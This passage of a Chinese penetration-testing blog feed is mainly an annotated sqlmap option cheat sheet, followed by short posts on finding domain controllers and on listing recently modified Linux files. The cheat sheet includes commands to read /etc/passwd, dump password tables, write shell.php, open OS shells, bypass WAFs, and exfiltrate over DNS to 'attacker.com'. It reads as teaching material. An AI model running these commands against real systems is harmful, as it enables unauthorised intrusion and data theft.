class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">--data=<span class="string">"user=xx&amp;pswd=yy"</span>   <span class="comment"># 数据（对于post请求：除了保存请求头的方法，也可以这样data加参数， 也支持get方法：参数放--data后面）</span></span><br><span class="line">--param-del=<span class="string">";"</span>   <span class="comment"># 变量分隔符(若多个变量不是以&amp;分割),如：参数以分号分割   --data="name=1;id=11" --param-del=";"</span></span><br><span class="line">--cookie <span class="string">"xxxxxxxxx"</span> --level=2 <span class="comment"># 带上cookie头(level=2时才会检查cookie是否存在注入点)参数: set-cookie / --drop-set-cookie 是否丢弃上一个cookie,使用新的cookie</span></span><br><span class="line"><span class="comment">#cookie ---&gt; 登陆后才能访问的页面</span></span><br><span class="line">--user-agent=<span class="string">"xxxxxxxxxx"</span>   <span class="comment">#  指定ua头</span></span><br><span class="line">--random-agent --level=3  <span class="comment"># 随机ua头字典: /usr/share/sqlmap/txt/user-agents.txt,  win下：sqlmap/data/txt/user-agents.txt</span></span><br><span class="line"><span class="comment">#--level&gt;=3   # 才会检查user-agent头是否存在sql注入</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#app/waf/IPS/IDS过滤异常的ua头，sqlmap会报错</span></span><br><span class="line"></span><br><span class="line">--host <span class="string">"aaaaaaa"</span> --level=5  <span class="comment"># host头</span></span><br><span class="line">--level=5  <span class="comment"># 才会检查host头是否存在sql注入(一般不建议设置这么高)</span></span><br><span class="line"></span><br><span class="line">--referrer --level=3     <span class="comment"># 检查referrer</span></span><br><span class="line">--level &gt;=3   <span class="comment"># 才会检查referrer是否存在sql注入</span></span><br><span class="line"></span><br><span class="line">--headers=<span class="string">"host:www.a.com\nUser-Agent:xps"</span>   <span class="comment"># 额外的自定义的headers（\n是换行，注意大小写）</span></span><br><span class="line">--headers=<span class="string">"X-Forwarded-For:* "</span> --dbs --batch </span><br><span class="line">--method=GET/POST  <span class="comment"># 限定请求方法</span></span><br></pre></td></tr></table></figure><ul><li><strong>基于http身份认证</strong>  </li></ul><p>三种身份认证类型：</p><ul><li>Basic</li><li>Diagest</li><li>NTLM<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--auth-type Basic  --auth-cred <span class="string">"user:pass"</span>  <span class="comment"># --auth-type指定身份认证类型，后门是账号密码</span></span><br></pre></td></tr></table></figure></li></ul><p>基于客户端证书的身份认证 :<br>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用的很少</span></span><br><span class="line"><span class="comment"># 下面两种参数不知道是哪个了，使用的时候自己查一下</span></span><br><span class="line">--auth-cert </span><br><span class="line">--auth-file=<span class="string">"ca.PEM"</span>    <span class="comment">#含有私钥的PEM的证书文件</span></span><br></pre></td></tr></table></figure></p><ul><li><strong>http(s)代理</strong><br>使用代理防止被封等<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--proxy=<span class="string">"http://127.0.0.1:8888"</span>          <span class="comment"># 本地网络的话不需要代理设置</span></span><br><span class="line">--auth-cred <span class="string">"user:pass"</span>     <span class="comment"># 如果需要身份认证</span></span><br><span class="line">--ignore-proxy   <span class="comment"># 忽略系统代理设置，通常用户扫描本地网络目标（用于对本地/内容目标进行扫描的时候）</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><strong>超时</strong><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--deplay=<span class="string">"6"</span>      <span class="comment"># 每次请求之间延迟时间， 单位:s</span></span><br><span class="line">--timeout=<span class="string">"10"</span>    <span class="comment"># 请求超时时间，浮点数，默认30s</span></span><br><span class="line">--retries=<span class="string">"5"</span>      <span class="comment"># 连接超时重试次数，默认3次</span></span><br><span class="line">--randomsize=<span class="string">"id"</span>    <span class="comment"># 长度、类型与原始值保持一致的前提下，指定每次请求随机取值 的参数name（对id随机取值,但长度与原始是一致的）</span></span><br></pre></td></tr></table></figure></li></ul>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">--scope         <span class="comment"># 过滤日志(burp的request日志--&gt;option,Logging,proxy,requests)内容， 通过正则筛选扫描对象；</span></span><br><span class="line">-l burp.log  --scope=<span class="string">"&#123;www&#125;?\.target\.&#123;com|net|org&#125;"</span> --level=3</span><br><span class="line"></span><br><span class="line">--safe-url / --safe-freq     <span class="comment"># 检测和盲注阶段会产生大量失败请求，服务端可能因此销毁session。</span></span><br><span class="line"><span class="comment">#因此：每发送 --safe-freq次注入请求之后，发送一次正常的请求</span></span><br><span class="line"></span><br><span class="line">--skip-urlencode    <span class="comment"># 跳过url编码(默认GET方法会对内容进行编码，某些编码人员不遵守编码规则没编码)</span></span><br><span class="line"> </span><br><span class="line">--<span class="built_in">eval</span>=<span class="string">"import hashlib;hash=hashlib.md5(id).hexdigest()"</span>   <span class="comment"># 每次请求之前执行的py代码  / 每次请求更改或者增加新的参数值（时间依赖。其他参数依赖）后面值是依赖前面值的</span></span><br><span class="line">-u <span class="string">"id=1?hash=c4ca423dj8caf5d"</span> --<span class="built_in">eval</span> =<span class="string">"import hashlib;hash=hashlib.md5(id).hexdigest()"</span>        <span class="comment"># 比如后面参数是hash的，每次都把id编码</span></span><br></pre></td></tr></table></figure> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#### &lt;font color=red&gt;3. Detection &lt;/font&gt;</span><br><span class="line">风险等级</span><br><span class="line">​```bash</span><br><span class="line">   --level    # 1-5级（默认1）   payload文件xml：/usr/share/sqpmap/xml/payloads， win：sqlmap\data\xml\payloads</span><br><span class="line">   --risk     # 1-4级(默认1/无害), risk升高可能造成数据被篡改风险(update),2会增加事件的测试语句，3会增加OR语句的sql注入测试</span><br><span class="line">   --string / --not-string  / --regexp   / --code  / --text-only  / --titles    # 页面比较，基于bool的注入监测，依据返回页面内容的百年华判断真假逻辑。但有些页面随着时间阈值变化，此时需要人为执行标识真假的字符串</span><br></pre></td></tr></table></figure><h4 id="4-Optimization"><a href="#4-Optimization" class="headerlink" title="4. Optimization "></a><font color="red">4. Optimization </font></h4><p>优化性能相关的参数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">--predict-output   <span class="comment"># 预设输出。根据检测方法，比对返回值和统计表内容，不断缩小监测范围；版本名，用户名，密码，Provileges，role，db名，表名，列名；</span></span><br><span class="line"><span class="comment">#与--threads不兼容；统计表</span></span><br><span class="line"><span class="comment">#进而精确定位是什么数据库和版本等，        /usr/share/sqlmap/txt/common-outputs.txt</span></span><br><span class="line"></span><br><span class="line">--keep-alive  <span class="comment"># 使用长连接，性能好，与--proxy不兼容， 但是大量长连接会严重占用服务器资源</span></span><br><span class="line"></span><br><span class="line">--null-connection   <span class="comment"># 只获取相应页面大小值，而非内容； 【用于盲注判断 真假】，降低网络带宽消耗；与--text-only参数不兼容(基于页面内容比较判断 真假)</span></span><br><span class="line"></span><br><span class="line">--threads=10  <span class="comment"># 最大并发线程，盲注时每个线程获取一个字符（7次请求），获取完成后线程结束；默认1，建议不要大于10（可能会影响站点性能）</span></span><br><span class="line"></span><br><span class="line">-o   <span class="comment"># 开启前三个性能参数（除了--threads）</span></span><br></pre></td></tr></table></figure></p><p><strong>指纹信息</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Figerprint</span></span><br><span class="line">-f  / --figerprint  / -b  /  --banner   <span class="comment"># dbms指纹信息； DBMS，操作系统，架构，补丁</span></span><br></pre></td></tr></table></figure></p><p>​     </p><h4 id="5-Enumeration"><a href="#5-Enumeration" class="headerlink" title="5. Enumeration "></a><font color="red">5. Enumeration </font></h4><p>枚举<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">     --schema --batch --exclude-sysdbs  <span class="comment"># sschema:元数据(使用默认选项)   -- batch:自动执行</span></span><br><span class="line">     --count</span><br><span class="line">     -a     <span class="comment"># --all</span></span><br><span class="line">     -b     <span class="comment"># --banner</span></span><br><span class="line">     --current-user</span><br><span class="line">     --current-db</span><br><span class="line">     --hostname <span class="comment"># 机器的主名</span></span><br><span class="line">     --is-dba</span><br><span class="line">     --users         <span class="comment"># 列出所有用户</span></span><br><span class="line">     --passwords</span><br><span class="line">     --privileges -U user_name  <span class="comment"># 查看用户的权限（不加-U就是查当前用户）</span></span><br><span class="line">     --roles</span><br><span class="line">     --dbs          <span class="comment"># 列出所有数据库</span></span><br><span class="line">     --tables</span><br><span class="line">     --columns</span><br><span class="line">     --schema       <span class="comment"># 列出information_schema信息    --schema --exclude-sysdbs </span></span><br><span class="line">     </span><br><span class="line">     <span class="comment"># Dump数据：</span></span><br><span class="line">     --dump  <span class="comment"># 获取表中的数据，包括列</span></span><br><span class="line">     --stop</span><br><span class="line">     --dump-all exclude-sysdbs   <span class="comment"># 除了系统库,...</span></span><br><span class="line">     -C   <span class="comment"># column</span></span><br><span class="line">     -T  glag_table</span><br><span class="line">     -D  dvwa</span><br><span class="line">     -X</span><br><span class="line">     -U   <span class="comment"># user</span></span><br><span class="line">     --start 100 --stop 200   <span class="comment"># 指定分段</span></span><br><span class="line">     --stop</span><br><span class="line">     --sql-query <span class="string">"select * from users"</span>   <span class="comment"># 后面加要执行的sql语句</span></span><br><span class="line">     </span><br><span class="line">     --exclude-sysdbs  <span class="comment"># 除去系统库</span></span><br><span class="line">     --pivot-column=P...   <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定库表的列</span></span><br><span class="line">-D dvwa -T users --columns</span><br><span class="line"><span class="comment"># dump数据</span></span><br><span class="line">-D dvwa -T users --dump</span><br></pre></td></tr></table></figure></p><h4 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h4><p>是基于字典的<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mysql &lt;5.0没有information_schema库， mysql&gt;=5.0如果无权读取...</span></span><br><span class="line"><span class="comment"># access 无权读物MSysyObjects库</span></span><br><span class="line">--common-tables</span><br><span class="line">--common-columns   <span class="comment"># (Access系统表无列信息)</span></span><br></pre></td></tr></table></figure></p><h4 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FILE SYSTEM:</span><br><span class="line">--file-read=<span class="string">"/etc/passwd"</span>   <span class="comment"># 读系统文件</span></span><br><span class="line">--file-write=<span class="string">"shell.php"</span>  --file-dest<span class="string">"/temp/shell.php"</span>   <span class="comment"># 写,前面是源文件，后门是要写入到的文件</span></span><br></pre></td></tr></table></figure><h4 id="UDF注入"><a href="#UDF注入" class="headerlink" title="UDF注入"></a>UDF注入</h4><p>详细的去查资料吧<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UDF injection:   (User Design Function)</span><br><span class="line">--udf-inject, --shared-lib   <span class="comment"># 编译共享库创建并上传到DB Server，以此生成UDF实现高级注入。</span></span><br><span class="line"><span class="comment">#Linux：share object, windows:DLL</span></span><br></pre></td></tr></table></figure></p><h4 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">OS:</span><br><span class="line"><span class="comment"># mysql, postgresql:  上传共享库并生成 sys-exec(), sys_eval()两个UDF</span></span><br><span class="line"><span class="comment"># MSsql： xp_cmdshell 存储过程(1.有就用，2.禁就启，3.没就建)</span></span><br><span class="line">--sql-shell</span><br><span class="line">--os-shell</span><br><span class="line">--os-cmd</span><br></pre></td></tr></table></figure><p>​     </p><h4 id="6-Miscelianeous"><a href="#6-Miscelianeous" class="headerlink" title="6. Miscelianeous:    "></a><font color="red">6. Miscelianeous:    </font></h4><p><img src="/sqlmap参数简介/z.png" alt><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-z  <span class="comment"># 参数助记符, </span></span><br><span class="line">--answer=<span class="string">"extending=N"</span>   <span class="comment"># 让出现提示的选项都选Y或N</span></span><br><span class="line">--check-waf   <span class="comment"># 检测WAF/IPS/IDS</span></span><br><span class="line">--hpp   <span class="comment"># 绕过检测WAF/IPS/IDS的有效方法；尤其对ASP/IIS 和ASP.NET/IIS检查</span></span><br><span class="line">--identify   <span class="comment"># 彻底检查WAF/IPS/I</span></span><br><span class="line">-mobile  <span class="comment"># 模拟智能手机设备</span></span><br><span class="line">--purge-output   <span class="comment"># 清除output文件夹</span></span><br><span class="line">--smart   <span class="comment"># 当有大量检测目标的时候，只选择基于错误的检测结果</span></span><br><span class="line">--wizard  <span class="comment"># 向导方式</span></span><br></pre></td></tr></table></figure></p><h4 id="7-General"><a href="#7-General" class="headerlink" title="7. General"></a><font color="red">7. General</font></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-s    <span class="comment"># sqlite会话文件保存位置</span></span><br><span class="line">-t    <span class="comment"># 记录流量文件保存位置</span></span><br><span class="line">--charset=GBK   <span class="comment"># 强制字符编码</span></span><br><span class="line">--crawl=3  <span class="comment"># 从起始位置爬站深度</span></span><br><span class="line">--csv-del=<span class="string">";"</span>   <span class="comment"># dump数据默认存在于","分割的csv文件中，可以指定其他分隔符</span></span><br><span class="line">--dbms-cred   <span class="comment"># 指定数据库账号</span></span><br><span class="line">--flush-session  <span class="comment"># 清空session</span></span><br><span class="line">--force-ssl    <span class="comment"># 让sqlmap知道访问的是https的网站</span></span><br><span class="line">--fresh-queries   <span class="comment"># 忽略seeeion查询结果</span></span><br><span class="line">--hex -v 3     <span class="comment"># dump非ASCII字符内容时，将其编码为16进制形式，收到后解码还原 </span></span><br><span class="line">--output-dir=<span class="string">"/tmp"</span></span><br><span class="line">--parse-errors    <span class="comment"># 分析和显示数据库内建保存信息</span></span><br><span class="line">--save   <span class="comment"># 将命令保存成配置文件</span></span><br></pre></td></tr></table></figure><h4 id="8-Windows-Registory"><a href="#8-Windows-Registory" class="headerlink" title="8. Windows Registory"></a><font color="red">8. Windows Registory</font></h4><p> win注册表<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 前提是有权限</span></span><br><span class="line">--reg-read  <span class="comment"># 读取</span></span><br><span class="line">--reg-add   <span class="comment"># 添加</span></span><br><span class="line">--reg-del</span><br><span class="line">--reg-key, --reg-value, --reg-data, --reg-type=<span class="string">''</span>    <span class="comment">#..键的值等于...</span></span><br></pre></td></tr></table></figure></p><p>​     </p><h4 id="9-injection"><a href="#9-injection" class="headerlink" title="9. injection"></a><font color="red">9. injection</font></h4><p>注入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">-p <span class="string">"id,referrer"</span>  指定扫描参数（即存在注入的那个参数），使 --level失效</span><br><span class="line"></span><br><span class="line">--skip=<span class="string">"name, user-agent"</span>   <span class="comment"># 排除指定的扫描参数</span></span><br><span class="line"></span><br><span class="line">--dbms  <span class="comment"># 判断数据库类型</span></span><br><span class="line">--dbms=<span class="string">"mysql"</span>   <span class="comment"># 指定只用mysql的方法进行注入</span></span><br><span class="line">--os=<span class="string">''</span>    <span class="comment"># 指定系统</span></span><br><span class="line">--invalid-bignum    /   --invalid-logical   <span class="comment"># bignum使用大数使参数值失效id=99999999；  logical 使用布尔判断使取值失效 id=13 AND 18=19</span></span><br><span class="line"></span><br><span class="line">--no-cast  <span class="comment">#  榨取数据时，sqlmap将所有结果转换为str，并将空格替换NULL结果</span></span><br><span class="line">--no-escape <span class="comment"># 关闭功能：（当payload中用单引号界定str时，sqlmap使用char()编码逃逸的方法替换str）</span></span><br><span class="line">--prefix   <span class="comment"># 前缀</span></span><br><span class="line">--suffix   <span class="comment"># 后缀    “...?id=1” -p id --prefix"')" --suffix "AND ('abc'='abc"</span></span><br><span class="line">--tamper=<span class="string">"xxxxx, yyyyyy, zzzzzz"</span>   <span class="comment"># 混淆脚本(可自定义脚本)，染过应用层过滤，ips，waf    位置:/usr/share/sqlmaptamper</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#伪静态注入(全是斜线，使用“*”符号来自定义注射位置) </span></span><br><span class="line">sqlmap -u <span class="string">"http://www.xxx.com/123/456*/789"</span> -v 4</span><br></pre></td></tr></table></figure></p><p>​     </p><h4 id="10-Techniques"><a href="#10-Techniques" class="headerlink" title="10. Techniques"></a><font color="red">10. Techniques</font></h4><p>技术<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#默认使用全部技术</span></span><br><span class="line">B:  Boolean-based <span class="built_in">bind</span></span><br><span class="line">E:  Error-based</span><br><span class="line">U:  Union auery-based</span><br><span class="line">S:  Stacked queries (文件系统，操作系统，注册表必须)</span><br><span class="line">T:  Time-based-bind</span><br><span class="line"></span><br><span class="line">--time-sec  <span class="comment"># 基于时间的注入检测相应延迟时间（默认5s）</span></span><br><span class="line">--union-cols 6-9  <span class="comment"># 默认联合查询1-10列，随--level增大最多支持50列 </span></span><br><span class="line"></span><br><span class="line">--union-char 123  <span class="comment"># 联合查询默认使用NULL， 极端情况下NULL可能失败，此时可以手动执行数值 </span></span><br><span class="line"></span><br><span class="line">--dns-domain attacker.com <span class="comment"># 攻击者控制了DNS服务器，使用此功能可以提高数据榨取速度</span></span><br><span class="line"></span><br><span class="line">--second-order http://1.1.1.1/a.php  <span class="comment"># 在一个页面注入的结果，在另一个页面体现出来</span></span><br></pre></td></tr></table></figure></p><p>​      </p><h1 id="小例子"><a href="#小例子" class="headerlink" title="小例子"></a>小例子</h1><p>获取指定数据库 指定表 指定列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--batch -D &apos;dbname&apos; -T &apos;tablename&apos; -C &apos;username.password&apos; --dump</span><br></pre></td></tr></table></figure><p>提权操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 数据库提权</span><br><span class="line">--batch --sql-hell</span><br><span class="line"></span><br><span class="line"># 系统提权</span><br><span class="line">--batch --os-shell</span><br><span class="line"></span><br><span class="line"># 执行系统命令(前提要有权限)</span><br><span class="line">--os-cmd=ls /</span><br></pre></td></tr></table></figure><p>把文件上传到数据库服务器中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py --file-write --file-dest &quot;服务器路径&quot;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/sqlmap参数简介/sqlmap.png&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="sqlmap" scheme="http://www.xpshuai.cn/tags/sqlmap/"/>
    
  </entry>
  
  <entry>
    <title>查找域控的几个常用方法</title>
    <link href="http://www.xpshuai.cn/%E6%9F%A5%E6%89%BE%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%87%A0%E4%B8%AA%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95/"/>
    <id>http://www.xpshuai.cn/查找域控的几个常用方法/</id>
    <published>2020-03-20T06:48:52.000Z</published>
    <updated>2020-04-20T14:50:24.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="查找域控的几个常用方法"><a href="#查找域控的几个常用方法" class="headerlink" title="查找域控的几个常用方法"></a>查找域控的几个常用方法</h4><p>1.net view</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain</span><br></pre></td></tr></table></figure><p>2.set log</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set log</span><br></pre></td></tr></table></figure><p>3.通过srv记录</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup -type=SRV _ldap._tcp.corp</span><br></pre></td></tr></table></figure><p>4.使用nltest</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /dclist:corp</span><br></pre></td></tr></table></figure><p>5.使用dsquery</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DsQuery Server -domain corp</span><br></pre></td></tr></table></figure><p>6.使用netdom</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdom query pdc</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;查找域控的几个常用方法&quot;&gt;&lt;a href=&quot;#查找域控的几个常用方法&quot; class=&quot;headerlink&quot; title=&quot;查找域控的几个常用方法&quot;&gt;&lt;/a&gt;查找域控的几个常用方法&lt;/h4&gt;&lt;p&gt;1.net view&lt;/p&gt;
&lt;figure class=&quot;high
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="域控" scheme="http://www.xpshuai.cn/tags/%E5%9F%9F%E6%8E%A7/"/>
    
  </entry>
  
  <entry>
    <title>linux找出最近或者今天被修改的文件</title>
    <link href="http://www.xpshuai.cn/Linux%E6%89%BE%E5%87%BA%E6%9C%80%E8%BF%91%E6%88%96%E8%80%85%E4%BB%8A%E5%A4%A9%E8%A2%AB%E4%BF%AE%E6%94%B9%E7%9A%84%E6%96%87%E4%BB%B6/"/>
    <id>http://www.xpshuai.cn/Linux找出最近或者今天被修改的文件/</id>
    <published>2020-03-20T03:58:08.000Z</published>
    <updated>2020-04-20T13:02:04.000Z</updated>
    
    <content type="html"><![CDATA[<p>参考：<a href="http://www.hackdig.com/01/hack-42547.htm" target="_blank" rel="noopener">http://www.hackdig.com/01/hack-42547.htm</a></p><h4 id="0x01-列出某个目录下今天创建或者修改的文件"><a href="#0x01-列出某个目录下今天创建或者修改的文件" class="headerlink" title="0x01 列出某个目录下今天创建或者修改的文件"></a>0x01 列出某个目录下今天创建或者修改的文件</h4><h6 id="1-显示目录home-ym下，今天创建或者修改的文件"><a href="#1-显示目录home-ym下，今天创建或者修改的文件" class="headerlink" title="1 显示目录home/ym下，今天创建或者修改的文件"></a>1 显示目录home/ym下，今天创建或者修改的文件</h6><p><code>ls  -al --time-style=+%D | grep &#39;date +%D&#39;</code></p><p>参数解释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-a - 列出所有文件，包括隐藏文件</span><br><span class="line">-l - 启用长列表格式</span><br><span class="line">--time-style=FORMAT - 显示指定 FORMAT 的时间</span><br><span class="line">+％D - 以 ％m/％d/％y （月/日/年）格式显示或使用日期-a - 列出所有文件，包括隐藏文件</span><br><span class="line">-l - 启用长列表格式</span><br><span class="line">--time-style=FORMAT - 显示指定 FORMAT 的时间</span><br><span class="line">+％D - 以 ％m/％d/％y （月/日/年）格式显示或使用日期</span><br></pre></td></tr></table></figure><h6 id="2-按字母顺序对结果排序显示"><a href="#2-按字母顺序对结果排序显示" class="headerlink" title="2 按字母顺序对结果排序显示"></a>2 按字母顺序对结果排序显示</h6><p><code>ls -alX --time-style=+%D | grep &#39;date +%D&#39;</code></p><h6 id="3-按文件大小从大到小对结果排序显示"><a href="#3-按文件大小从大到小对结果排序显示" class="headerlink" title="3 按文件大小从大到小对结果排序显示"></a>3 按文件大小从大到小对结果排序显示</h6><p><code>ls -alS --time-style=+%D | grep &#39;date +%D&#39;</code></p><h4 id="0x02-列出某天所有被修改文件"><a href="#0x02-列出某天所有被修改文件" class="headerlink" title="0x02 列出某天所有被修改文件"></a>0x02 列出某天所有被修改文件</h4><h6 id="1-列出当前目录今天被修改的文件"><a href="#1-列出当前目录今天被修改的文件" class="headerlink" title="1 列出当前目录今天被修改的文件"></a>1 列出当前目录今天被修改的文件</h6><p><code>find . -maxdepth 1 -newermt &quot;2017-1-8&quot;</code></p><p><code>find . -maxdepth 1 -newermt &quot;1/8/2017&quot;</code></p><h6 id="2-列出系统中今天被修改的所有文件"><a href="#2-列出系统中今天被修改的所有文件" class="headerlink" title="2 列出系统中今天被修改的所有文件"></a>2 列出系统中今天被修改的所有文件</h6><p><code>find .  -newermt &quot;2017-1-8&quot;</code></p><p><code>find . -newermt &quot;1/8/2017&quot;</code></p><h4 id="0x03-查找被访问过的文件"><a href="#0x03-查找被访问过的文件" class="headerlink" title="0x03  查找被访问过的文件"></a>0x03  查找被<code>访问</code>过的文件</h4><h6 id="1-今天被访问的文件"><a href="#1-今天被访问的文件" class="headerlink" title="1 今天被访问的文件"></a>1 今天被访问的文件</h6><p><code>find /home -atime 0 #查看home 目录下今天被访问的文件</code></p><h6 id="2-查看几天之内被访问的文件"><a href="#2-查看几天之内被访问的文件" class="headerlink" title="2 查看几天之内被访问的文件"></a>2 查看几天之内被访问的文件</h6><p><code>find . -atime +2  # -atime n,  File  was last accessed n*24 hours ago.；查看当前目录三天之内被访问的文件</code></p><h4 id="0x04-查看被修改过的文件"><a href="#0x04-查看被修改过的文件" class="headerlink" title="0x04 